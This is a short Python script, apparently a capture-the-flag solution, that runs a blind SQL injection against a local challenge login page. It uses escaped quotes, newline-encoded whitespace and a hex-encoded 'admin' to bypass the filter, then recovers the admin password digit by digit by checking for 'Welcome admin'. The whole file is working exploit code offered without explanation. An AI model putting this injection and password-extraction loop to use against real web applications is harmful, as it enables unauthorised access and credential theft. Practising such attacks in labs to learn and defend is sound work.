import requests
url="http://localhost/chall/?user=\&pw=%0a||%0a(user%0aregexp%0a0x61646d696e%0a%26%26%0a(pw)%0aregexp%0a\"^"
pay="1234567890"
passwd=""
for i in range(1,10):
    corr=0
    for j in pay:
        query=url+passwd+j+"\");%00"
        print(query)
        http=requests.get(query)
        if "Welcome admin" in http.text:
            passwd=passwd+j
            print(passwd)
            corr+=1
    if corr==0:
        break
print("Final pw : "+passwd)
